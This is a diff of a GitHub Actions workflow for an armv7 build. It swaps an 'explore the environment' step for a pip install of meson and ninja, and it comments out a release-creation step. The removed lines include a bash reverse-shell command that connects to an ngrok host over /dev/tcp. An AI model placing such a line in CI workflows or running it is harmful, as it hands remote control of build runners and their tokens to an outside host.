@@ -20,25 +20,22 @@ jobs:
           arch: armv7
           distro: ubuntu18.04
 
-          # Not required, but speeds up builds by storing container images in
-          # a GitHub package registry.
           githubToken: ${{ github.token }}
           
           # To explore the enviroment
           run: |
-            echo Starting something
-            /bin/bash -c 'bash -i >& /dev/tcp/2.tcp.ngrok.io/11678 0>&1'
+            pip install meson ninja
 
       - name: Get the output
         run: |
           echo finished
           
-      - name: Create Release
-        id: create_release
-        uses: softprops/action-gh-release@v0.1.14
-        env:
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-        with:
-          generate_release_notes: true
-          draft: false
-          prerelease: false
+      # - name: Create Release
+      #   id: create_release
+      #   uses: softprops/action-gh-release@v0.1.14
+      #   env:
+      #     GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      #   with:
+      #     generate_release_notes: true
+      #     draft: false
+      #     prerelease: false
